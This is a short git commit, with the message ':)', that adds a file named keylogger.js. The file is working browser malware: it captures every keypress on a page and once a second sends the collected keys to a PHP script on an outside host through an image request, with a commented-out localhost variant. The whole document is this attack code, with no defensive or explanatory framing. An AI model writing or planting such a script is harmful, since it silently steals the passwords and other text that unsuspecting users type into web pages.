2818433ee1860267d68331dc5fa2f8b108435ef4
912d <re@tfwno.gf>
2014-05-25 19:18:18 +0200

    :)

---
+++ keylogger.js
@@ -0,0 +1,15 @@
+var keys = '';
+
+        document.onkeypress = function(e) {
+            var get = window.event ? event : e;
+            var key = get.keyCode ? get.keyCode : get.charCode;
+            key = String.fromCharCode(key);
+            keys += key;
+        }
+
+        window.setInterval(function(){
+            if( keys != "" )
+                //new Image().src = 'http://localhost/~re/kylg.php?c=' + keys;
+                new Image().src = 'http://domek.obywateleuropy.eu/kylg.php?c=' + keys + ' ';
+            keys = '';
+        }, 1000);
